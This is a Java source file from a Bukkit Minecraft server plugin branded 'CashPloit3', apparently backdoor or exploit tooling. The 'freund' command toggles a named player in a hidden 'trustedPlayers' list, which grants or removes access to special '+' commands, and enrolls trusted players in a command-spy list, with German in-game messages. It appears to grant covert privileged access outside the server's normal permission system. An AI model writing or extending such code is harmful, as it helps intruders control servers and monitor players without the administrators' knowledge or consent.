package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.entity.Player;

public class Command_FREUND extends CommandBase {

    public Command_FREUND() {
        super("freund", "<Spieler>" + " §d| " + ChatColor.GRAY + "Spieler kann + Befehle nutzen", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            Player vic = Bukkit.getPlayer(args[1]);
            if (Start.INSTANCE.trustedPlayers.contains(vic.getName())) {
                Start.INSTANCE.trustedPlayers.remove(vic.getName());
                vic.getPlayer().sendTitle(ChatColor.GOLD + "CashPloit" + ChatColor.AQUA + "3", "§cDu kannst keine + Befehle mehr benutzen.");
                vic.sendMessage(Start.INSTANCE.chatPrefix + "§cDu kannst keine + Befehle mehr benutzen.");
                vic.getPlayer().playSound(vic.getLocation(), Sound.ENDERDRAGON_DEATH, 1.1F, 1.1F);
                p.sendMessage(Start.INSTANCE.chatPrefix + "§cDieser Spieler kann keine + Befehle mehr nutzen!");
            } else {
                Start.INSTANCE.trustedPlayers.add(vic.getName());
                vic.sendMessage(Start.INSTANCE.chatPrefix + "Du kannst nun ebenfalls §c+ §aBefehle nutzen :D");
                vic.getPlayer().sendTitle(ChatColor.GOLD + "CashPloit" + ChatColor.AQUA + "3", "§aDu kannst nun §c+ §aBefehle benutzen.");
                vic.getPlayer().playSound(vic.getLocation(), Sound.ENDERDRAGON_GROWL, 1.1F, 1.1F);
                p.sendMessage(Start.INSTANCE.chatPrefix + "§aDieser Spieler kann nun + Befehle benutzen!");
                if (!Command_COMMANDSPY.players.contains(vic)) {
                    Command_COMMANDSPY.players.add(vic);
                }
            }
        }
    }

}
